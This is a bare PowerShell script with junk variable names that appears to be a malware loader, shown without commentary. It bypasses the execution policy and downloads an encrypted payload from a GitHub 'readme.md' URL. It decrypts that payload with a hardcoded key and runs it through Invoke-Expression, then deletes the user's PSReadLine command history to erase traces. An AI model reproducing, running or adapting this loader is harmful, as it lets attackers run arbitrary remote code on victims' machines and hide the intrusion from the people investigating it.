$srfdgc = "pjhgbnm ghnmfb"

Function DecodeString
{
	[CmdletBinding()] Param (
		[Parameter(Position = 0, ValueFromPipeline = $True)]
		[ValidateNotNullOrEmpty()]
		[String]
		$obfString,
		
		[Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Key		
    )
	
	$segsd = [System.Convert]::FromBase64String($Key)
		
	$werfg = (New-Object  Management.Automation.PSCredential ' ', ($obfString |ConvertTo-SecureString -Key  $segsd)).GetNetworkCredential().Password

	return $werfg
}

$rfvwd = "https://raw.githubusercontent.com/waterblue4321/sky/refs/heads/main/"
$tid = "db"


function getinfo
{
	$Key = "D3oHe/dirRTPHP0y/hC/iTgEkItBte+/xVXNuYj/s10="
	$endtag = "readme.md"
	$downpsurl = $rfvwd + $endtag
	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
	$comletter = DecodeString -obfString $codestring -Key $Key
	
	$result = Invoke-Expression $comletter	
}

function lkjeiwe
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

	getinfo
	$aqwrfszva = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	$fffd = Test-Path $aqwrfszva
	if($fffd -eq $True)
	{
		Remove-Item -path $aqwrfszva -Recurse
	}
	
}
lkjeiwe


